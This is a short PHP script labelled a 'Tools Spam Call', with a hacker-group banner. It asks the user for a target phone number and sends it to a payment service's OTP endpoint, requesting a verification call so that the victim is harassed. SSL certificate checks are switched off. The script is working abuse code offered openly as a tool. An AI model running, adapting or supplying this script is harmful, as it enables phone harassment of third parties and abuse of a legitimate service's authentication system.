<?php
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
menu:
system($bersih);
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
echo $red."
 __ __  ___  __  __   ___      __  ____   ___  ___  ___
 || // // \\ ||\ ||  // \\    (( \ || \\ // \\ ||\\//||
 ||<<  ||=|| ||\\|| (( ___     \\  ||_// ||=|| || \/ ||
 || \\ || || || \||  \\_||    \_)) ||    || || ||    ||\n";
echo $green."
==============================
|[!]  Army Cyber Network  [!]|
==============================\n";
echo "\n";
echo "Tools Spam Call\n";
echo $red."
Codec By MryM\n";
echo "Nomor Target\nMasukan : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
